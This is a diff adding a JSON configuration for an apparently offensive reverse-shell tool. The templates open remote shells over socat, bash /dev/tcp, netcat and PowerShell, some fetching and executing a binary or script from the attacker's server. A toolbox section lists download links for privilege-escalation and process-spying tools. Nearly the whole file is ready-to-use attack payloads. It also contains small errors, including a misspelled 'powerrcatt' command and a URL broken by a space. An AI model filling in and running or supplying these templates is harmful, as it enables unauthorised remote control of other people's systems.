@@ -1,0 +1,71 @@
+{
+    "shelly": {
+        "default_http_svr": 8080
+    },
+    "shells": {
+        "socat": {
+            "listener" : "socat_raw",
+            "serve": ["socat"],
+            "templates": [
+                "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
+                "wget -q http://{ip}:{http_port}/socatx64.bin -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}"
+            ]
+        },
+        "bash": {
+            "templates": [
+                "/bin/bash -i >& /dev/tcp/{ip}/{port} 0>&1",
+                "0<&196;exec 196<>/dev/tcp/{ip}/{port}; /bin/bash <&196 >&196 2>&196",
+                "exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
+                "/bin/bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5",
+                "/bin/bash -i >& /dev/udp/{ip}/{port} 0>&1"
+            ]
+        },
+        "nc": {
+            "templates": [
+                "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
+                "nc {ip} {port} -e /bin/bash",
+                "nc.exe {ip} {port} -e /bin/bash"
+            ]
+        },
+        "powercat": {
+            "serve": ["powercat"],
+            "templates": [
+                "powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}:{http_port}/powercat.ps1');powerrcatt -c {ip} -p {port} -e cmd\""
+            ]
+        }
+    },
+    "toolbox": {
+        "socat": {
+            "lin_64": {
+                "filename": "socatx64.bin",
+                "download": "https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.bin"
+            },
+            "win_64": {
+                "filename": "socatx64.exe",
+                "download": "https://github.com/3ndG4me/socat/releases/download/v1.7.3.3/socatx64.exe"
+            }
+        },
+        "peas": {
+            "lin_64": {
+                "download": "https://github.com/peass-ng/PEASS-ng/releases/download/20251017-d864f4c3/linpeas.sh",
+                "filename": "linpeas.sh"
+            },
+            "win_64": {
+                "download": "https://github.com/peass-ng/PEASS-ng/releases/download/20251017-d864f4c3/winPEASx64.exe",
+                "filename": "winPEASx64.exe"
+            }
+        },
+        "pspy": {
+            "lin_64": {
+                "download": "https: //github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64",
+                "filename": "pspy64"
+            }
+        },
+        "powercat":{
+            "win_64":{
+                "download": "https://github.com/rexpository/powercat-v2.0/raw/refs/heads/main/powercat.ps1",
+                "filename": "powercat.ps1"
+            }
+        }
+    }
+}
